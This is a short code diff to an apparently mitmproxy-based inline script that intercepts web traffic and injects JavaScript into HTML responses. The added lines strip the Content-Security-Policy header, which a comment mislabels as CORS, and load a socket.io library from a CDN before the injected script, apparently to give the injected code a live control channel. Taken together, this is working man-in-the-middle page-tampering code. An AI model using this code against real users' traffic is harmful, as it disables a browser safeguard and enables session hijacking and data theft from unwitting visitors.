@@ -14,9 +14,15 @@ def response(context, flow):
     with decoded(flow.response):
         html = BeautifulSoup(flow.response.content)
         if html.body and ("text/html" in flow.response.headers["content-type"]):     # inject only for HTML resources
+            # delete CORS header if present
+            if "Content-Security-Policy" in flow.response.headers:
+                del flow.response.headers["Content-Security-Policy"]
+            # inject SocketIO library from CDN
+            cdn = html.new_tag("script", type="text/javascript", src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js")
+            html.body.insert(0, cdn)
             script = html.new_tag("script", type="application/javascript")
             script.insert(0, read_file(context.script))
-            html.body.insert(0, script)
+            html.body.insert(1, script)
             flow.response.content = str(html)
             context.log("script injected")
 
